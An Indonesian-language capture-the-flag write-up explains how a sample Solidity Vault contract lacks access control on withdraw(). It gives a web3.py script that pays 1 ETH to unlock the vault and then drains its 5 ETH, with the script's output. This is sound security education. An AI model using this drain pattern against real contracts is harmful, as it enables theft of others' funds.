# Writeup — Vault Breach

## Deskripsi Challenge

Challenge ini berada pada kategori **blockchain** dengan judul **Vault Breach**.

Deskripsi challenge:

```text
A vault smart contract guards ETH deep in the blockchain. Pay the toll, unlock the vault, drain the funds.
```

Kita diberikan informasi koneksi berikut:

```text
Chain ID: 31337
RPC: https://rpc-01kyyqx82jn5gevrw0xdrhpbk7.u-ctf-ctf-7001b39a.urc.tf/

Wallet:
Address: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
Private Key: 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
Balance: 10 ETH

Vault:
0x5B05Bb225700FFD64fA1814f62E59a63012eA74C
```

Pada halaman challenge juga diberikan ABI dan source code smart contract `Vault`.

---

## Source Code

Source contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title Vault — sample Web3 CTF challenge
/// @notice A locked vault holding ETH. Pay 1 ETH to unlock, then drain it.
contract Vault {
    address public owner;
    bool public locked;

    constructor() payable {
        owner = msg.sender;
        locked = true;
    }

    /// @notice Send >= 1 ETH to unlock the vault.
    function unlock() external payable {
        require(msg.value >= 1 ether, "Insufficient payment");
        locked = false;
    }

    /// @notice Withdraw all funds (only when unlocked).
    function withdraw() external {
        require(!locked, "Vault is locked");
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }

    /// @notice Returns true when the challenge is solved (vault drained).
    function isSolved() external view returns (bool) {
        return !locked && address(this).balance == 0;
    }
}
```

---

## Analisis Vulnerability

Contract ini memiliki state variable:

```solidity
address public owner;
bool public locked;
```

Pada constructor, `owner` di-set sebagai deployer contract, dan kondisi awal vault dibuat terkunci:

```solidity
constructor() payable {
    owner = msg.sender;
    locked = true;
}
```

Secara sekilas, adanya variable `owner` membuat contract terlihat seperti hanya owner yang boleh mengakses dana. Namun setelah dicek, variable `owner` tidak pernah dipakai untuk membatasi akses pada fungsi penting.

Fungsi `unlock()` dapat dipanggil oleh siapa pun selama mengirim minimal 1 ETH:

```solidity
function unlock() external payable {
    require(msg.value >= 1 ether, "Insufficient payment");
    locked = false;
}
```

Setelah `unlock()` dipanggil, state `locked` berubah menjadi `false`.

Masalah utama ada pada fungsi `withdraw()`:

```solidity
function withdraw() external {
    require(!locked, "Vault is locked");
    (bool ok, ) = msg.sender.call{value: address(this).balance}("");
    require(ok, "Transfer failed");
}
```

Fungsi ini hanya mengecek apakah vault sudah tidak terkunci. Tidak ada modifier atau pengecekan seperti:

```solidity
require(msg.sender == owner);
```

Akibatnya, siapa pun yang sudah membuka vault dapat memanggil `withdraw()` dan menerima seluruh saldo ETH dari contract.

---

## Root Cause

Root cause vulnerability-nya adalah **missing access control**.

Contract memiliki variable `owner`, tetapi tidak menggunakannya untuk membatasi fungsi `withdraw()`.

Seharusnya fungsi `withdraw()` memiliki validasi seperti:

```solidity
require(msg.sender == owner, "Not owner");
```

Namun pada challenge ini, fungsi `withdraw()` terbuka untuk siapa pun setelah vault di-unlock.

Dengan demikian, exploit cukup dilakukan dengan dua transaksi:

```text
1. Panggil unlock() dengan value 1 ETH.
2. Panggil withdraw() untuk mengambil seluruh balance vault.
```

---

## Exploit Plan

Kondisi awal dari script:

```text
player balance : 10 ETH
vault balance  : 5 ETH
locked         : True
```

Vault memiliki saldo 5 ETH dan masih terkunci.

Langkah eksploitasi:

```text
1. Kirim transaksi ke unlock() dengan value 1 ETH.
2. State locked berubah dari true menjadi false.
3. Kirim transaksi ke withdraw().
4. Contract mengirim seluruh balance ke msg.sender.
5. Balance vault menjadi 0.
6. isSolved() mengembalikan true.
```

---

## Catatan Error Saat Signing

Pada percobaan awal, script menggunakan private key untuk melakukan signing manual. Namun muncul error:

```text
TypeError: Unknown kwargs: ['gasPrice']
```

Error ini terjadi karena transaksi terbaca sebagai EIP-1559 transaction atau type 2, tetapi masih membawa field legacy `gasPrice`.

Karena halaman challenge menyatakan wallet sudah:

```text
Unlocked On RPC: yes
```

maka solusi lebih sederhana adalah menggunakan akun unlocked langsung dari RPC dengan:

```python
contract.functions.foo().transact({"from": PLAYER})
```

Dengan cara ini, kita tidak perlu melakukan signing manual menggunakan private key.

---

## Solver

Solver final menggunakan `web3.py`:

```python
from web3 import Web3

RPC = "https://rpc-01kyyqx82jn5gevrw0xdrhpbk7.u-ctf-ctf-7001b39a.urc.tf/"
PLAYER = Web3.to_checksum_address("0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266")
VAULT = Web3.to_checksum_address("0x5B05Bb225700FFD64fA1814f62E59a63012eA74C")

ABI = [
    {
        "inputs": [],
        "stateMutability": "payable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "locked",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "unlock",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

w3 = Web3(Web3.HTTPProvider(RPC))
vault = w3.eth.contract(address=VAULT, abi=ABI)

print("[*] chain id       :", w3.eth.chain_id)
print("[*] player         :", PLAYER)
print("[*] vault          :", VAULT)
print("[*] player balance :", w3.from_wei(w3.eth.get_balance(PLAYER), "ether"), "ETH")
print("[*] vault balance  :", w3.from_wei(w3.eth.get_balance(VAULT), "ether"), "ETH")
print("[*] locked         :", vault.functions.locked().call())

if vault.functions.locked().call():
    print("[*] unlocking vault with 1 ETH...")
    tx = vault.functions.unlock().transact({
        "from": PLAYER,
        "value": w3.to_wei(1, "ether"),
        "gas": 100000,
    })
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print("[+] unlock tx      :", receipt.transactionHash.hex())

print("[*] withdrawing...")
tx = vault.functions.withdraw().transact({
    "from": PLAYER,
    "gas": 100000,
})
receipt = w3.eth.wait_for_transaction_receipt(tx)
print("[+] withdraw tx    :", receipt.transactionHash.hex())

print("[*] player balance :", w3.from_wei(w3.eth.get_balance(PLAYER), "ether"), "ETH")
print("[*] vault balance  :", w3.from_wei(w3.eth.get_balance(VAULT), "ether"), "ETH")
print("[*] locked         :", vault.functions.locked().call())
print("[*] solved         :", vault.functions.isSolved().call())
```

---

## Output

Saat solver dijalankan:

```text
[*] chain id       : 31337
[*] player         : 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
[*] vault          : 0x5B05Bb225700FFD64fA1814f62E59a63012eA74C
[*] player balance : 10 ETH
[*] vault balance  : 5 ETH
[*] locked         : True
[*] unlocking vault with 1 ETH...
[+] unlock tx      : 9a6c1b985a3aa6966215509459174644c1f84ddb5b0febc2420fab394d390986
[*] withdrawing...
[+] withdraw tx    : 3f02659660f809b515c076742d97292bc037ba0395191dc35f2eed9b07562600
[*] player balance : 14.999896557747383929 ETH
[*] vault balance  : 0 ETH
[*] locked         : False
[*] solved         : True
```

Setelah transaksi `withdraw()` berhasil, balance vault menjadi:

```text
0 ETH
```

Dan fungsi `isSolved()` mengembalikan:

```text
True
```

---

## Flag

Challenge berhasil diselesaikan setelah `isSolved()` bernilai `true`.

Flag tidak dicetak langsung oleh contract, tetapi didapat melalui tombol solve pada halaman challenge setelah kondisi solved terpenuhi.

---

